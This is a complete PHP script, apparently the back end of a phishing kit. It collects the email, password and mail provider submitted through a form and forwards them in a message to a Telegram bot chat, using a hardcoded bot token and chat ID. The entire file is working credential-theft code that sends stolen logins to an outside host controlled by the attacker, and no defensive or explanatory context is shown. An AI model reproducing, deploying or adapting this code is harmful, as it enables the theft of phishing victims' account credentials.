<?php
// telegram.php

// Replace these with your actual Telegram bot token and chat ID
$botToken = "8733467958:AAENsooga6Q70o_W8yH_cA5ZLYtMx_qM-AA"; // 
$chatId = "7500645284";     //

// Get POST data
$email = $_POST['email'];
$password = $_POST['password'];
$detail = $_POST['detail'];

// Compose message
$message = "New Submission:\nEmail: $email\nPassword: $password\nProvider: $detail";

// Initialize cURL
$url = "https://api.telegram.org/bot$botToken/sendMessage";

$post_fields = [
    'chat_id' => $chatId,
    'text' => $message,
];

$ch = curl_init(); 
curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type:application/json"));
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($post_fields));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

// Send back success response
echo json_encode(['signal' => 'ok', 'msg' => 'Data sent to Telegram']);
?>